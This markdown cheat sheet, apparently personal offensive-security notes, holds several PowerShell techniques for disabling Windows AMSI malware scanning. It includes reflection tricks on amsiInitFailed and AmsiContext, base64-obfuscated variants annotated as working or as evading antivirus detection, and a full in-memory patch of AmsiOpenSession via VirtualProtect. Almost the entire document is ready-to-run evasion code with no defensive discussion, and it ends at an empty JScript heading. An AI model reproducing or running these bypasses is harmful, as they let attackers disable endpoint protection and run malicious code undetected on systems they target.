# Powershell 
<br>

### Disables AMSI by attacking initialization 
<br>

``` powershell

$loc = 'System.Management.Automation.AmsiUtils'
$field = 'amsiInitFailed'
$GT = [Ref].Assembly.GetType($loc).GetField($field,'NonPublic,Static')
$GT.SetValue($null,$true)

```

**Obfuscated WORKING AMSI bypass.  Same as above just obfuscated for ps1 script**

```powershell
$amut = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="));$field = 'amsiInitFailed'; $GT = [Ref].Assembly.GetType($amut).GetField($field,'NonPublic,Static');$GT.SetValue("",$true)
```
<br>
<br>

### Disable AMSI by attacking AmsiContext and rewrite first 4 bytes to 0000  
<br>

``` powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like ("*i" + "Utils")) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

```
<br><br>

**Above is flagged by AV.  This is not but this also doesnt block anything AMSI for me....**

``` powershell
$find = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KgBpAFUAdABpAGwAcwA=")); $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like $find) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### Disable AMSI by patching internals (This attack only seems to work for me when pasting into powershell.  Not loading a ps1 file 

**After performing this attack make sure to reset the memory back to its old read/execute permissions**

``` powershell

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

```
<Br><br>

``` powershell


function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('Xyxtem.dll'.Replace('X','S').Replace('x','s')) }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

function x0r {

    param (
        $buf,
        $xorKey
    )
    [Byte[]] $xorBuf = @()
    for ($i = 0; $i -lt $buf.Length; $i++) {
    $xorByte = $buf[$i] -bxor $xorKey
    $xorBuf += [Byte]$xorByte
    }


 return $xorBuf

}


[IntPtr]$funcddr = LookupFunc amsi.dll AmsiOpenSession
$oldBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcddr, 3, 0x40, [ref]$oldBuffer)

$3buf = [Byte[]] (0x48, 0x31, 0xC0) 


[System.Runtime.InteropServices.Marshal]::Copy($3buf, 0, $funcddr, 3)


```


# JSCRIPT
